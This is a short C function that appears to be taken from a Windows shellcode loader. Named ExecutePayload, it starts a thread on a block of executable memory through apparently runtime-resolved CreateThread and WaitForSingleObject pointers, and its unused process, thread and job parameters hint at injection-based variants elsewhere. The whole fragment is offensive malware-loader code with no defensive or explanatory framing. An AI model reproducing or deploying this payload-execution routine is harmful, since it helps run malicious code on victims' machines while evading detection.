void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
    (void)hTargetProcess;
    (void)hTargetThread;
    (void)hJob;
    (void)payload;
    (void)payload_len;

    DEBUG_PRINT("Executing payload via CreateThread...");
    HANDLE hThread = pfnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread != NULL) {
        pfnWaitForSingleObject(hThread, INFINITE);
    }
}
